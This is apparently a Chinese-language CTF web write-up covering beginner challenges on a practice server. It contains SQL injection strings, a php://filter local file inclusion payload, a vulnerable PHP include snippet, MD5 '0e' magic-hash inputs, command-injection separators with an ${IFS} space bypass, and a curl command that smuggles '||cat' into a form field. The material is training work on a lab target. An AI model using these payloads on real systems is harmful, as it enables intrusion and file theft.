###### tags: `ctf`
# ctf-web

解題紀錄

## Web developer

看原始碼就出來了～

## Robots.txt

遇到這種題目直接更改網址就好

http://140.110.112.32:2001/robots.txt

然後它很調皮的又要轉一次位置

![](https://i.imgur.com/wTHhfJY.png)

然後就可以到一串數字....去解碼吧..

![](https://i.imgur.com/Nsj2bI3.png)

![](https://i.imgur.com/GgpjUsx.png)


先把它給十六進制解碼得到```QnJlYWtBTExDVEZ7N1F0S0IyTjVUbHFBQUV6Q3J6Tk99```

在用base64轉回來：```BreakALLCTF{7QtKB2N5TlqAAEzCrzNO}```

## Curl-1

[相關說明](https://zh.wikipedia.org/wiki/網域名稱轉址)

直接用curl 來跑一次
```http://140.110.112.32:2004/```
可以看到他跟你說了flag的位置
![](https://i.imgur.com/YMLnToh.png)
然後我們在讓它去跑一次

``` curl -l http://140.110.112.32:2004/index.php```
這樣flag救出來啦

```BreakALLCTF{91YODwgPD58gpC4H9AeD}```

## SQL injection

首先看到這行我怕了...
於是我開了自己的網路，但是...
它偷偷聯回去學術網...


![](https://i.imgur.com/gHkZOhk.png)

當然遇到這種題目就是直接插入啦～
```"' OR ''=''#" ```或是 ```"' OR ''=''-- "```

然後flag就出來啦～

![](https://i.imgur.com/WOuHvT2.png)


## Local File Inclusion 1 

LFI 顧名思義就是直接進去網站裡面，可以直接去切換資料夾

![](https://i.imgur.com/yBFKlvD.png)


## Local File Inclusion 2

首先這種題目一定是先用./去戳戳看，但是它跳出了
![](https://i.imgur.com/1DYlEDA.png)

所以果斷換個方式，接下來將網址後面改成這串去戳戳看
```140.110.112.32:4005/?f=php://filter/read=convert.base64-encode/resource=index.php```

它就炸了..
然後噴出這一串
![](https://i.imgur.com/rwMY1Fa.png)
照慣例把它給拿去base 64 decode
然後它會噴出一堆html
```htmlmixed=
<html>
<head>
<meta charset="UTF-8">
<title>Article System</title>
<!-- Bootstrap core CSS -->
<link href="https://getbootstrap.com/docs/4.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
<!-- Navbar -->
<header>
      <!-- Fixed navbar -->
      <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
        <a class="navbar-brand" href="#">MyBLOG</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarCollapse">
          <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
              <a class="nav-link" href="/index.php">Home<span class="sr-only">(current)</span></a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/?f=about.php">Ablout</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/?f=xd.php">XD</a>
            </li>
          </ul>
          <form class="form-inline mt-2 mt-md-0">
            <input class="form-control mr-sm-2" type="text" placeholder="Search" aria-label="Search">
            <button class="btn btn-outline-success my-2 my-sm-0" type="submit">Search</button>
          </form>
        </div>
      </nav>
    </header>
<main role="main" class="container">
<br><br><br><br>
        <?php
        // here is no flag Q___Q
        // flag is in /flag
        $f = $_GET['f'];
        if(stripos($f, "../") !== FALSE) {
                echo "<div class='alert alert-danger' role='alert'>Oops! ../ will be filtered. You are Bad Hacker!</div>";
                $f = str_replace("../","",$f);
        }
        include($f);
        ?>
      <pre style="font-size:25px">
 _________
| hack me |
 ---------
      \   ^__^
       \  (oo)\_______
          (__)\       )\/\
              ||----w |
              ||     ||
      </pre>
</main>
</body>
</html>

```
從這邊可以看到，flag在``` /flag```下，所以切換過去，就可以拿到flag了

## Md5 collision

這題是在將PHP處理0e開頭的漏洞，在處理hash的時候，php會利用哈希來進行比較，它會將每一個0e都視為0，而當兩個0e去進行比較時，它會視為相同，也就會變成true

下面有幾個0e開頭的紀錄在這邊
```php=
QNKCDZO
0e830400451993494058024219903391
  
s878926199a
0e545993274517709034328855841020
  
s155964671a
0e342768416822451524974117254469
  
s214587387a
0e848240448830537924465865611904
  
s214587387a
0e848240448830537924465865611904
  
s878926199a
0e545993274517709034328855841020
  
s1091221200a
0e940624217856561557816327384675
  
s1885207154a
0e509367213418206700842008763514
  
s1502113478a
0e861580163291561247404381396064
  
s1885207154a
0e509367213418206700842008763514
  
s1836677006a
0e481036490867661113260034900752
  
s155964671a
0e342768416822451524974117254469
  
s1184209335a
0e072485820392773389523109082030
  
s1665632922a
0e731198061491163073197128363787
  
s1502113478a
0e861580163291561247404381396064
  
s1836677006a
0e481036490867661113260034900752
  
s1091221200a
0e940624217856561557816327384675
  
s155964671a
0e342768416822451524974117254469
  
s1502113478a
0e861580163291561247404381396064
  
s155964671a
0e342768416822451524974117254469
  
s1665632922a
0e731198061491163073197128363787
  
s155964671a
0e342768416822451524974117254469
  
s1091221200a
0e940624217856561557816327384675
  
s1836677006a
0e481036490867661113260034900752
  
s1885207154a
0e509367213418206700842008763514
  
s532378020a
0e220463095855511507588041205815
  
s878926199a
0e545993274517709034328855841020
  
s1091221200a
0e940624217856561557816327384675
  
s214587387a
0e848240448830537924465865611904
  
s1502113478a
0e861580163291561247404381396064
  
s1091221200a
0e940624217856561557816327384675
  
s1665632922a
0e731198061491163073197128363787
  
s1885207154a
0e509367213418206700842008763514
  
s1836677006a
0e481036490867661113260034900752
  
s1665632922a
0e731198061491163073197128363787
  
s878926199a
0e545993274517709034328855841020
 
```

## Command injection

簡單來說它就是利用一個分號```;```來讓前一個指令閉合，當然還有其他的像是：
- &&ls
- ||ls
- $(ls)
- \`ls\`

如果題目有擋空格，可以用${IFS}來替代空格

![](https://i.imgur.com/p6HLWkp.png)


## vtim_cmdi

``` curl -d "url=||cat /flag/Flag/flag" "http://140.110.112.32:31339" ```


